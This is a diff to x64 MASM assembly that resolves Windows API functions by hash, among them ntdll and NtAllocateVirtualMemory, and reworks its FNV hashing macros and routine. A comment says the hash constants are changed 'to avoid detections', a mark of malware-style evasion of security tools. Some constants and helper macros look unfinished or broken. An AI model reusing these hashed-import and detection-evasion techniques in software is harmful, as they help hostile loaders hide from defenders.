@@ -38,19 +38,17 @@ include win.inc
 ; primes with our own value to avoid detections on these values.
 ; 
 
-stringify macro arg
-    local tmp
-    tmp catstr <'>,arg,<'>
-    exitm tmp
-endm
 
-rnd_seed        textequ stringify(@Time)
 seed_mask       equ 0x29A29A29A29A29A2
 hash_mask       equ 0x29A29A29A29A29A2
 hash_offset     equ 0xcbf29ce484222325 xor hash_mask
 hash_prime      equ 0x00000100000001b3 xor hash_mask
 hash_ntdll      equ 0x5703856CC8FC1C79
 hash_ntavm      equ 0x6640A8978F501F9A
+
+echo_local macro arg
+    exitm % arg
+endm
 
 ; emit the bytes of a constant string
 emit_bytes macro string
@@ -59,43 +57,45 @@ emit_bytes macro string
     endm
 endm
 
-gethash_m macro src, constname
-    local len,i,c,r
-    len textequ %(@SizeStr(<src>)) -2 ;; -2 is for the double quote
-    i = 0
-    repeat len
-        c  substr <src>, i+1, 1
-        byte stringify(c)
+rnd macro __mask
+    local m
+    m=(@SubStr(%@Time,7,2)+@Line)*(@SubStr(%@Date,1,2)+@SubStr(%@Date,4,2)*100+@SubStr(%@Date,7,2))* (-1001)
+    m=(m+@SubStr(%@Time,1,2)+@SubStr(%@Time,4,2))*(@SubStr(%@Time,7,2)+1)
+    ifnb <__mask>
+        m = m and __mask
+    endif
+    exitm % m
+endm
+
+ctodec macro char
+    local tmp
+    tmp = 0x00
+    while tmp lt char
+
+        tmp = tmp + 1
     endm
+    ; if char eq 'A'
+    ;     tmp = 0x78
+    ; endif
+    exitm % tmp
 endm
 
-; break the 64 bit _hash into two 32 bit parts and set register dst to the
-; reassembled result
-genhash macro _hash, dst, tmp
-    local   hi 
-    local   lo 
-    hi      = _hash and 0xffffffff00000000
-    lo      = _hash and 0x00000000ffffffff
-    mov     dst, hi
-    mov     tmp, lo
-    or      dst, tmp
-endm
+char textequ < >
+gethash_m macro src, constname
+    local basis, prime, mask, hash
+    hash = 0x811c9dc
+    prime = 0x01000193
 
-; emit an opaque predicate using register r1 with a fake jump to dead_offset
-; emit_opq macro r1, dead_offset
-;     local   jl0
-;     local   jl1
-;     xor     r1, r1
-; jl0:
-;     test    r1, r1
-;     jz      jl1
-;     jmp     jl0
-;     lea     r1, offset jl1
-;     test    r1, r1
-;     jnz     jl0
-;     db      0xeb, dead_offset
-; jl1:
-; endm
+    forc value, <src>
+        char catstr <'>,<value>,<'>
+        %echo echo_local(hash) xor ctodec(<char>)
+        hash = hash xor char
+        hash = hash * prime
+    endm
+
+    constname equ hash
+    %echo echo_local(constname)
+endm
 
 ; --- structures                    
 dapi_entry struct                           ; dynamic import table entry
@@ -114,11 +114,9 @@ start proc
     local   d_ents[10]:dapi_entry
     local   d_table:dapi
     local   key:qword
-    gethash_m 'NtAllocateVirtualMemory', testcnst
-    genhash hash_mask, rcx, rax             ; put together the high and low parts of the mask
-    mov     [key], rcx                      ; function key is now on the stack
-
-    genhash hash_ntdll, rcx, rax
+    gethash_m ntdll.dll, testcnst
+    
+    mov     rcx, hash_ntdll
     call    getmod
     mov     rcx, rax
     mov     rdx, hash_ntavm
@@ -239,21 +237,17 @@ gethash proc fastcall src:qword, len:dword
     xor     rbx, rbx
     mov     rsi, rcx                        ; rsi is the source buffer
     xor     ecx, ecx                        ; ecx is the counter
-    mov     rax, hash_offset                ; rax is the encoded hash (basis)
-    mov     r8, hash_mask                   ; decode the basis
-    xor     rax, r8                         ; ...
+    mov     eax, 0x811c9dc                  ; rax is the encoded basis (basis)
 _loop:
     cmp     ecx, edx
     je      _done
     mov     bl, [rsi+rcx]
-    xor     rax, rbx                        ; hash = hash ^ src[i]
-    mov     rdi, hash_prime                 ; rdi is the prime (encoded)
-    xor     rdi, r8                         ; decode the prime
-    imul    rax, rdi                        ; hash = hash * prime
+    xor     eax, ebx                        ; hash = hash ^ src[i]
+    mov     edi, 0x01000193
+    imul    eax, edi                        ; hash = hash * prime
     inc     ecx
     jmp     _loop
 _done:
-    xor     rax, r8                         ; mask the hash
     pop     rdi
     pop     rsi
     pop     rbx
